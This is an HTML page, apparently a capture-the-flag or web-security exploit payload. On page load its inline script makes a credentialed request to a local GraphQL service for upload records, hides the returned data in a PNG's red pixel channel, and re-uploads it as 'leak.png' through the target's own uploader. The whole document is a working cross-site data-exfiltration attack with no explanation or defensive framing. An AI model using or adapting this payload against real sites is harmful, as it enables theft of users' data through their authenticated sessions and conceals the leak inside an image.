<!DOCTYPE html>
<html>
  <body>
    <script>
      (async () => {
        // 1. Fetch GraphQL data
        const res = await fetch("http://localhost:1337/graphql", {
          method: "POST",
          credentials: "include",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            query: `
              query {
                uploads {
                  id
                  filename
                  uploadedBy
                }
              }
            `
          })
        });
      
        const json = await res.json();
        const text = JSON.stringify(json);
      
        // 2. Encode into a PNG
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        const w = 200;
        const h = Math.ceil(text.length / w);
        canvas.width = w;
        canvas.height = h;
      
        for (let i = 0; i < text.length; i++) {
          const char = text.charCodeAt(i);
          const x = i % w;
          const y = Math.floor(i / w);
          // encode each char in red channel, leave green/blue zero
          ctx.fillStyle = `rgb(${char},0,0)`;
          ctx.fillRect(x, y, 1, 1);
        }
      
        // 3. Convert canvas to Blob (PNG)
        canvas.toBlob(async blob => {
          const form = new FormData();
          form.append("file", blob, "leak.png");
      
          // 4. Upload using the target's uploader
          await fetch("http://localhost:1337/upload", {
            method: "POST",
            credentials: "include",
            body: form
          });
        }, "image/png");
      })();

    </script>
  </body>
</html>
